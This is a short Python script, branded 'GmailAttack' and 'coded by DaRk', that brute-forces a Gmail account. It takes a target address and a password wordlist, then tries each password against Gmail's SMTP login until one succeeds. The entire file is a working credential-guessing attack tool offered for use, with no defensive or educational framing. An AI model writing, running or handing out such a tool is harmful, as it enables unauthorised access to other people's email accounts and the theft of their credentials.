import smtplib
from os import system

def logo():
    print("""
   _____                 _ _         _   _             _    
  / ____|               (_) |   /\  | | | |           | |   
 | |  __ _ __ ___   __ _ _| |  /  \ | |_| |_ __ _  ___| | __
 | | |_ | '_ ` _ \ / _` | | | / /\ \| __| __/ _` |/ __| |/ /
 | |__| | | | | | | (_| | | |/ ____ \ |_| || (_| | (__|   < 
  \_____|_| |_| |_|\__,_|_|_/_/    \_\__|\__\__,_|\___|_|\_\
                                                            
                                                            """)
    
    print("}--------------- coded by DaRk ---------------{")
logo()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter Target (Gmail Adress): ")

pwd = input("Enter 0 if you want to use the inbuilt basic wordlist of passwords, enter 1 if you want to use your own:")

if pwd == "0":
    passswfile="inbuiltpasslist.txt"

if pwd == "1":
    passswfile = input("Path of your passlist: ")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Pasword Is Wrong. %s " % password)
